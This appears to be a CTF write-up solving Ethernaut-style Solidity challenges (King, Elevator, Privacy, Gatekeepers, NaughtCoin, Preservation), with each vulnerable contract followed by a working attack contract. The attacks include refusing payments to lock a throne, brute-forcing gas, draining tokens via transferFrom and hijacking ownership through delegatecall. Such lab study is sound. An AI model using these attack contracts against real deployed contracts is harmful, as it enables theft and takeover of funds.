<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IKing &#123;</span><br><span class="line">    function _king() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line">    address payable public king;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        king = payable(0xC81297Dc635a59D16e60a518c7F27f56B0def02a);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function exploit() external payable &#123;</span><br><span class="line">        (bool ok, ) = king.call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        require(ok, &quot;bid failed&quot;);</span><br><span class="line">        require(IKing(king)._king() == address(this), &quot;not king&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert(&quot;I refuse to step down&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h3><p>This issue primarily arises when balances are not checked and updated beforehand during transactions&#x2F;transactions.</p>
<p>The call function transfers control to the target contract. If the target contract then calls withdraw one or more times within its receive or fallback function after accepting the transfer, a reentrancy attack can occur.</p>
<p>We can <strong>check and update the balance</strong> beforehand by adding state variables to the target address, as detailed previously.</p>
<h3 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h3><p>The following contract calls isLastFloor twice. We need to return false the first time and true the second time.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../src/Elevator.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack is Building &#123;</span><br><span class="line">    Elevator public target;</span><br><span class="line">    bool private toggle;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = Elevator(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256) external override returns (bool) &#123;</span><br><span class="line">        toggle = !toggle;</span><br><span class="line">        return toggle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 floor) external &#123;</span><br><span class="line">        target.goTo(floor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, we want to return false the first time and true the second time. There are many ways to do this.</p>
<ol>
<li>toggle &#x3D; !toggle</li>
<li>toggle ++; toggle &#x3D; toggle % 2;</li>
<li>toggle &#x3D; toggle &amp; true;</li>
<li>Directly store a set of false and true values in an array&#x2F;mapping.</li>
<li>Alternatively, set a counter to return false the first time and true thereafter.</li>
</ol>
<h3 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h3><p>Target Contract</p>
<p>The key is to understand <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html?utm_source=chatgpt.com">Solidity’s slot storage rules</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925">https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925</a></p>
<p>This article also works.</p>
<p>Note that variables declared as constants and immutables are not stored in slots.</p>
<p>Then use getStorageAt to read the corresponding slot and then call await contract.unlock(‘0xdata’); in the console.</p>
<p>Then bytes16 retrieves the first 16 bytes.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GateKeeper1-and-2"><a href="#GateKeeper1-and-2" class="headerlink" title="GateKeeper1_and_2"></a>GateKeeper1_and_2</h3><p><strong>GateKeeper1</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here, gateOne requires an indirect call. tx.origin is our EOA address, and msg.sender is our attack contract address.</p>
<p>gateTwo is used to exhaustively enumerate the gas required to meet the requirements; gateThree is constructed based on the requirements. bytes8 &#x3D;&#x3D; uint64</p>
<p>uint16 is used to extract the first two bytes.</p>
<p>The attack contract is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IGatekeeperOne &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    IGatekeeperOne public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = IGatekeeperOne(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Construct a key that matches gateThree:</span><br><span class="line">	  // The lower 32 bits == the lower 16 bits (i.e., 0x0000 + the lower 16 bits of origin), and the whole 64 bits != the lower 32 bits (the upper 32 bits are non-zero).</span><br><span class="line">    function buildKey() public view returns (bytes8 key) &#123;</span><br><span class="line">        uint16 low16 = uint16(uint160(tx.origin));     </span><br><span class="line">        uint64 low32 = uint64(low16);                  </span><br><span class="line">        uint64 hi32  = 1;                              </span><br><span class="line">        key = bytes8((uint64(hi32) &lt;&lt; 32) | low32);    // such as 0x00000001_0000ZZZZ</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Find gas such that gasleft()%8191==0</span><br><span class="line">    function exploit() external &#123;</span><br><span class="line">        bytes8 key = buildKey();</span><br><span class="line"></span><br><span class="line">        // Give a larger base and try it for 0..8191</span><br><span class="line">        for (uint256 i = 0; i &lt; 8191; i++) &#123;</span><br><span class="line">            // 注意：这里用 .call 手工指定 gas</span><br><span class="line">            (bool ok, ) = address(target).call&#123;gas: 200000 + i&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key)</span><br><span class="line">            );</span><br><span class="line">            if (ok) &#123;</span><br><span class="line">                // pass gateTwo + gateThree + gateOne</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>GateKeeper2</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The first one is the same here, so we’ll skip it.</p>
<p>gateTwo requires our attack contract code to have a size of 0. Here, we need to perform the attack in the contract’s constructor. Since the bytecode hasn’t been written to the chain yet, its size is 0.</p>
<p>gateThree is a simple XOR operation, so there’s nothing much to say.</p>
<p>The attack contract is as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IGatekeeper &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack2 &#123;</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">// Called in the constructor, extcodesize(this) == 0 ⇒ Passes gateTwo</span><br><span class="line">// At this point, msg.sender is the contract address ⇒ Use address(this) to calculate the key</span><br><span class="line">        uint64 h = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));</span><br><span class="line">        bytes8 key = bytes8(~h); // 等价于 bytes8(type(uint64).max ^ h)</span><br><span class="line"></span><br><span class="line">        IGatekeeper(_target).enter(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Here, the second question only needs to be deployed, and no additional console or script calls are required.</p>
<h3 id="NaughtCoin"><a href="#NaughtCoin" class="headerlink" title="NaughtCoin"></a>NaughtCoin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is primarily due to the fact that in ERC20, not only “Transfer” can transfer funds, but “TransferFrom” can also be used. Furthermore, the contract does not impose any restrictions on the “TransferFrom” function, allowing the timestamp check to be bypassed.</p>
<p>attack contract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface IERC20 &#123;</span><br><span class="line">    function transferFrom(address from, address to, uint256 amount) external returns (bool);</span><br><span class="line">    function balanceOf(address account) external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract NaughtDrain &#123;</span><br><span class="line">    function drain(address token, address from, address to) external &#123;</span><br><span class="line">        uint256 amt = IERC20(token).balanceOf(from); // 如果没有balanceOf接口，就把额度写死传参</span><br><span class="line">        IERC20(token).transferFrom(from, to, amt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Here we also lock TransferFrom to prevent</p>
<h3 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h3><p><a target="_blank" rel="noopener" href="https://rareskills.io/post/delegatecall">https://rareskills.io/post/delegatecall</a><br>One point worth mentioning here is the relationship between delegatecall and storage(slot). It modifies the data in slot 0 (according to the effect of the called function).</p>
<p>So, here, we can set the address of our attack contract to slot 0.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击合约为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    address public timeZone1Library; // slot0，20 bytes</span><br><span class="line">    address public timeZone2Library; // slot1</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public&#123;</span><br><span class="line">    // Note that the signatures need to be consistent. Since we only need the first three slots (up to the owner), the rest are not important.</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写成这样可避免此类攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">library TimeLib &#123;</span><br><span class="line">    function normalize(uint256 t) internal pure returns (uint256) &#123;</span><br><span class="line">        // do some check</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PreservationSafeA &#123;</span><br><span class="line">    address public immutable owner;</span><br><span class="line">    uint256 public storedTime;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFirstTime(uint256 t) external &#123;</span><br><span class="line">        storedTime = TimeLib.normalize(t);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setSecondTime(uint256 t) external &#123;</span><br><span class="line">        storedTime = TimeLib.normalize(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable 